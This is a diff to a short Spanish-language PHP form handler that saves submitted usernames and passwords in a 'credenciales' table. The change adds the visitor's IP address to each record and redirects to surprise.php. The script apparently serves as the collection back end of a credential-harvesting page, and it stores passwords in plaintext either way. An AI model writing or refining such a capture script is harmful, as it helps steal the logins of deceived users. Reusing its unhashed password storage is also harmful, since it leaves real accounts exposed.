@@ -1,13 +1,27 @@
 <?php
 require_once "conexion.php";
 
-if (mysqli_connect_errno()){
-    echo "Error de conexión:" .mysqli_connect_errno();
+// Verifica conexión
+if (mysqli_connect_errno()) {
+    echo "Error de conexión: " . mysqli_connect_error();
+    exit();
 }
 
-$SQL="INSERT INTO credenciales (usuario,contraseña) VALUES('".$_POST['usuario']."','".$_POST['contraseña']."')";
-mysqli_query($conex,$SQL);
-mysqli_close($conex);
-header("Location: index.php"); // Asegúrate de incluir comillas
+// Obtener datos del formulario y la IP del usuario
+$usuario = $_POST['usuario'];
+$contraseña = $_POST['contraseña'];
+$ip = $_SERVER['REMOTE_ADDR']; // Captura la IP del cliente
+
+// Preparar la consulta para evitar SQLi
+$stmt = $conex->prepare("INSERT INTO credenciales (usuario, contraseña, ip) VALUES (?, ?, ?)");
+$stmt->bind_param("sss", $usuario, $contraseña, $ip);
+
+// Ejecutar y cerrar
+$stmt->execute();
+$stmt->close();
+$conex->close();
+
+// Redirigir
+header("Location: surprise.php");
 exit();
 ?>
